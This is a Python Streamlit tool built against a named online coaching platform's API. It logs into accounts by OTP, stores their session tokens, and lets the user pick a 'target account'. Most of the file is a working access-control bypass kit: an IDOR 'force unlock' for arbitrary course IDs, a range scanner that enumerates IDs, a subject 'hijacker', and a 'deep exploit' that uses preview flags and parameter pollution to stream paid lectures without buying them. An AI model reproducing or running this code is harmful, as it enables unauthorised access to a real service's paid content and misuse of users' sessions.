import streamlit as st
import requests
import sqlite3
import os

# ---------------- 1. DATABASE (Safe & Cached) ----------------
@st.cache_resource
def get_db():
    conn = sqlite3.connect("vibrant_final_v11.db", check_same_thread=False)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (email TEXT PRIMARY KEY, token TEXT, uid TEXT)")
    conn.commit()
    return conn

conn = get_db()
c = conn.cursor()

# ---------------- 2. PROFESSIONAL API ENGINE (Crash-Proof) ----------------
def api_call(url, params=None, token=None):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "auth-key": "appxapi",
        "client-service": "Appx",
        "source": "website",
        "origin": "https://www.vibrantacademy.com",
        "referer": "https://www.vibrantacademy.com/",
        "accept-language": "en-US,en;q=0.9"
    }
    if token:
        # JWT Fix: Token cleaning to avoid server-side decode errors
        clean_token = str(token).strip().replace("\n", "").replace("\r", "")
        headers["Authorization"] = f"Bearer {clean_token}"
    
    try:
        r = requests.get(url, params=params, headers=headers, timeout=15)
        if r.status_code == 200:
            try:
                return r.json()
            except:
                return {"error": "Invalid JSON", "raw": r.text}
        return {"error": f"Server Error {r.status_code}", "raw": r.text, "code": r.status_code}
    except Exception as e:
        return {"error": str(e)}

# ---------------- 3. GLOBAL CONFIG ----------------
API_BASE = "https://vibrantacademykotaapi.akamai.net.in/get"
st.set_page_config(page_title="Vibrant Pro Elite", layout="wide", page_icon="🎓")

st.markdown("""
    <style>
    .stButton>button { width: 100%; border-radius: 8px; font-weight: bold; background-color: #ff4b4b; color: white; }
    .stExpander { background-color: #161b22; border: 1px solid #30363d; border-radius: 10px; }
    div[data-testid="stMetricValue"] { color: #00ff00; }
    </style>
    """, unsafe_allow_html=True)

# ---------------- 4. SIDEBAR: AUTHENTICATION ----------------
with st.sidebar:
    st.title("🛡️ Session Injector")
    email_in = st.text_input("Mobile / Email", placeholder="Target ID")
    
    if st.button("📩 Request OTP"):
        if email_in:
            with st.spinner("Processing..."):
                res = api_call(f"{API_BASE}/sendotp", {"phone": email_in})
                if "error" not in res: st.success("OTP Sent!")
                else: st.error(res["error"])
        else: st.warning("Enter ID first")

    otp_in = st.text_input("Enter OTP", type="password")
    
    if st.button("🚀 Sync Account"):
        if email_in and otp_in:
            with st.spinner("Extracting Session..."):
                v_params = {"useremail": email_in, "otp": otp_in, "device_id": "V_Elite_V11"}
                res = api_call(f"{API_BASE}/otpverify", v_params)
                
                token, uid = None, None
                if isinstance(res, dict):
                    user_data = res.get("user")
                    if isinstance(user_data, dict):
                        token = user_data.get("token")
                        uid = user_data.get("userid") 

                if token:
                    c.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?)", (email_in, token, str(uid)))
                    conn.commit()
                    st.success(f"✅ Success! Welcome {res.get('user', {}).get('name', 'User')}")
                    st.rerun()
                else:
                    st.error("❌ Token capture failed.")
                    st.json(res)
        else: st.error("Fill both fields")

# ---------------- 5. MAIN DASHBOARD ----------------
users_list = [row[0] for row in c.execute("SELECT email FROM users").fetchall()]

if not users_list:
    st.info("👋 Use sidebar to login.")
    st.stop()

selected_user = st.selectbox("🎯 Target Account", users_list)
row = c.execute("SELECT token, uid FROM users WHERE email=?", (selected_user,)).fetchone()

if row:
    active_token, active_uid = row
    st.sidebar.success(f"Active: {selected_user}")
    
    m1, m2 = st.columns(2)
    m1.metric("Sessions Saved", len(users_list))
    m2.metric("Active UID", active_uid)
    st.divider()

    # ---------------- 6. CLASSROOM ENGINE ----------------
    col1, col2 = st.columns(2)
    
    with col1:
        if st.button("📚 Load Enrolled Courses", type="primary"):
            with st.spinner("Fetching..."):
                res = api_call(f"{API_BASE}/get_user_liked_items", {"user_id": active_uid}, token=active_token)
                if res.get("code") == 500: # Legacy fallback
                    res = api_call(f"{API_BASE}/get_user_liked_items", {"userid": active_uid}, token=active_token)

                if "error" not in res:
                    st.session_state.courses_data = res.get('data', [])
                    if not st.session_state.courses_data: st.warning("No paid courses found.")
                else:
                    st.error(f"Server Error. Try Scanner below.")

    if "courses_data" in st.session_state and st.session_state.courses_data:
        course_map = {c.get("course_name", "Unknown"): c.get("id") for c in st.session_state.courses_data}
        choice = st.selectbox("Choose Enrolled Batch", ["Select..."] + list(course_map.keys()))
        
        if choice != "Select...":
            batch_id = course_map[choice]
            l_res = api_call(f"{API_BASE}/get_batch_contents", {"batch_id": batch_id}, token=active_token)
            lectures = l_res.get('data', {}).get('lectures', []) or l_res.get('data', [])
            
            if lectures:
                for lec in lectures:
                    with st.expander(f"▶️ {lec.get('title', 'Lecture')}"):
                        if st.button(f"Play Video: {lec['id']}", key=f"v_p_{lec['id']}"):
                            v_url = f"{API_BASE}/fetchVideoDetailsById?course_id={batch_id}&video_id={lec['id']}&ytflag=0&folder_wise_course=1"
                            v_res = api_call(v_url, token=active_token)
                            v_path = (v_res.get('data') if isinstance(v_res.get('data'), dict) else {}).get('video_path')
                            if v_path: st.video(v_path)
                            else: st.error("No stream found.")
                        if lec.get('pdf_url'): st.link_button("📄 PDF Notes", lec['pdf_url'])

    # ---------------- 7. ADVANCED BATCH SCANNER (IDOR Bypass) ----------------
    st.divider()
    st.subheader("🕵️ IDOR Explorer (Force Access)")
    
    tab1, tab2 = st.tabs(["🎯 Manual Bypass", "🔎 Range Scanner"])

    with tab1:
        test_id = st.text_input("Target Course/Batch ID", placeholder="Try 11, 12, etc.")
        if st.button("🔓 Attempt Force Unlock"):
            with st.spinner("Injecting Token..."):
                scan_res = api_call(f"{API_BASE}/userfiltercourse", {"courseid": test_id}, token=active_token)
                if "error" not in scan_res:
                    st.success(f"✅ Access Granted to ID {test_id}")
                    # Fetching lectures directly
                    lec_res = api_call(f"{API_BASE}/get_batch_contents", {"batch_id": test_id}, token=active_token)
                    lecs = lec_res.get('data', {}).get('lectures', []) or lec_res.get('data', [])
                    if lecs:
                        for l in lecs:
                            with st.expander(f"🔓 {l.get('title')}"):
                                if st.button(f"Watch: {l['id']}", key=f"v_f_{l['id']}"):
                                    v_res = api_call(f"{API_BASE}/fetchVideoDetailsById?course_id={test_id}&video_id={l['id']}&ytflag=0&folder_wise_course=1", token=active_token)
                                    v_p = (v_res.get('data') if isinstance(v_res.get('data'), dict) else {}).get('video_path')
                                    if v_p: st.video(v_p)
                                if l.get('pdf_url'): st.link_button("📄 PDF", l['pdf_url'])
                    else: st.info("No lectures in this ID.")
                else: st.error("ID Locked or Invalid.")

    with tab2:
        st.write("Find valid IDs in range:")
        cs1, cs2 = st.columns(2)
        sid = cs1.number_input("Start", value=1)
        eid = cs2.number_input("End", value=100)
        if st.button("🚀 Scan Range"):
            found = []
            pb = st.progress(0)
            for i, cid in enumerate(range(int(sid), int(eid) + 1)):
                pb.progress((i + 1) / (eid - sid + 1))
                r = api_call(f"{API_BASE}/userfiltercourse", {"courseid": cid}, token=active_token)
                if "error" not in r:
                    found.append(str(cid))
                    st.toast(f"Found: {cid}")
            if found: st.success(f"Active IDs: {', '.join(found)}")
            else: st.warning("Nothing found.")
# ---------------- 9. SUBJECT-LEVEL UNLOCKER (Plan B) ----------------
st.divider()
st.subheader("🔓 Plan B: Subject/Topic Hijacker")

with st.expander("Try Deep Injection (Bypasses Course Purchase)"):
    sub_id = st.text_input("Enter Subject/Topic ID (Trial & Error: 1-500)")
    
    if st.button("⚡ Force Fetch by Subject"):
        with st.spinner("Searching for leaked content..."):
            # Kuch APIs direct subject ID se videos de deti hain
            # Endpoint: get_lessons_by_subject_id
            leak_res = api_call(f"{API_BASE}/get_lessons_by_subject_id", {"subject_id": sub_id}, token=active_token)
            
            if "error" not in leak_res and leak_res.get('data'):
                st.success(f"🔥 Jackpot! Leaked content found in Subject {sub_id}")
                videos = leak_res.get('data', [])
                for v in videos:
                    st.write(f"🎬 {v.get('title')}")
                    if st.button(f"Watch {v['id']}", key=f"leak_{v['id']}"):
                        # Direct call to video fetch
                        v_res = api_call(f"{API_BASE}/fetchVideoDetailsById", {"video_id": v['id']}, token=active_token)
                        st.video(v_res.get('data', {}).get('video_path'))
            else:
                st.error("This Subject ID is either empty or strictly locked.")
# ---------------- 10. DEEP-EXPLOIT BYPASS (The "Nuclear" Option) ----------------
st.divider()
st.subheader("🚀 Powerful Content Bypass (Exploit Mode)")

with st.expander("⚠️ Run Deep Exploit (Bypass Purchase Checks)"):
    target_id = st.text_input("Target Batch/Course ID", key="exploit_id")
    
    if st.button("🔥 Execute Bypass"):
        with st.spinner("Finding security loopholes..."):
            # Logic A: Global Search (Try to fetch content without UID mapping)
            # Bahut si APIs UID na bhejne par pura data leak kar deti hain
            exploit_params = {
                "course_id": target_id,
                "is_free": "1",        # Try to trick as demo content
                "type": "all",         # Attempt to pull all types
                "preview": "true"      # Access preview mode
            }
            
            # Requesting a different, often less secure endpoint
            res = api_call(f"{API_BASE}/get_course_details", exploit_params, token=active_token)
            
            if "error" not in res:
                st.success("✅ Exploit Successful: Course Metadata Leaked!")
                # Extracting internal IDs for videos/PDFs
                sections = res.get('data', {}).get('sections', [])
                for sec in sections:
                    st.write(f"📂 **Section: {sec.get('title')}**")
                    for item in sec.get('items', []):
                        if st.button(f"Force Unlock: {item['title']}", key=item['id']):
                            # Logic B: Direct ID Hijack for Video
                            v_res = api_call(f"{API_BASE}/fetchVideoDetailsById", {"video_id": item['id']}, token=active_token)
                            st.video(v_res.get('data', {}).get('video_path'))
            else:
                st.error("Standard Exploit Failed. Trying Parameter Pollution...")
                # Logic C: Parameter Pollution
                res_alt = api_call(f"{API_BASE}/get_batch_contents", {"batch_id": target_id, "user_id": "0"}, token=active_token)
                st.json(res_alt)